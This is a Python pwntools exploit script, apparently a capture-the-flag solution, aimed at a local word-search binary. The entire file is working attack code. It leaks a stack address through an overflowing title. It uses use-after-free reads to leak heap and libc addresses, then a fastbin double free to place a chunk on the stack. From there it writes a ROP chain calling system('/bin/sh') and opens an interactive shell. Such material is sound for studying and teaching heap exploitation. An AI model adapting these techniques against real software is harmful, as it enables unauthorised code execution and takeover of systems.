#/usr/bin/env python
# -*- coding:utf-8 -*-

from pwn import *
import struct

# context.log_level = 'debug'
context.update(arch="amd64", os="linux")

p = process('./search-bf61fbb8fa7212c814b2607a81a84adf', raw=False)

main_arena_off = 0x3c3b78	# Use pwndbg "bins" & "vmmap" command to get the offset to libc base address
binsh_off = 0x18c58b
system_off = 0x45380
pop_rdi_ret = 0x400e23	# Use ROPGadget to get "pop rdi; ret;"

def leak_stack():
	# title()
	p.sendline('A' * 48)
	leak = p.recvline().split(' ')[0][48:]
	# p.clean()
	return leak[::-1].encode('hex') if leak != None else None

def sentence(s):
	p.sendline('2')
	p.sendline(str(len(s)))
	p.sendline(s)

def search_word(s):
	p.sendline('1')
	p.sendline(str(len(s)))
	p.sendline(s)

def leak_heap():
	'''
		use-after-free+fastbin leak heap base
	'''
	sentence(('a' * 12 + ' b c ').ljust(40, 'd'))
	search_word('a' * 12)
	p.sendline('y')

	sentence('e' * 64)
	search_word('\x00')
	p.sendline('y')

	p.recvuntil('Found 40: ')
	p.recvuntil('Found 40: ')
	leak = u64(p.recvline()[:8]) & ~0xFFF
	# leak = u64(p.recvline()[:8])
	return hex(leak)

def leak_libc():
	'''
		use-after-free+smallbin leak libc 
	'''
	sentence(('a'*256 + ' bb c ').ljust(512, 'd'))
	search_word('bb')
	p.sendline('y')
	search_word('\x00\x00')
	p.recvuntil('Found 512: ')
	p.recvuntil('Found 512: ')
	return hex(u64(p.recvline()[:8])-main_arena_off)

def pwn(stack, libc):
	'''
		double free fastbins
	'''
	# p.clean()
	sentence('a'*51 + ' vigi')
	sentence('b'*51 + ' vigi')
	sentence('c'*51 + ' vigi')
	search_word('vigi')

	p.sendline('y')	# delete c
	p.sendline('y')	# delete b
	p.sendline('y')	# delete a
	# fastbins [head]->a->b->c->null
	search_word('\x00'*4)
	p.sendline('y')	# delete b
	p.sendline('n') # not delete a
	# # fastbins [head]->b->a->b->...
	sentence(p64(int(stack, 16)+0x52).ljust(56, '\x00'))
	# # fastbins [head]->a->b->stack
	sentence('d'*56)
	# # fastbins [head]->b->stack
	sentence('e'*56)
	# # fastbins [head]->stack
	sentence(('A'*6+p64(pop_rdi_ret)+p64(int(libc, 16)+binsh_off)+p64(int(libc, 16)+system_off)).ljust(56, 'O'))
	p.sendline('3')


def main():
	# p.sendline('2')
	p.recvline()
	p.recvline()
	p.recvline()
	stack = leak_stack()
	while (stack == ''):
		stack = leak_stack()
	# print 'Stack address: ' + '0x' + stack
	libc = leak_libc()
	# print 'Libc address: ' + libc
	p.sendline('n')
	pwn(stack, libc)
	p.clean()
	p.interactive()



if __name__ == '__main__':
	main()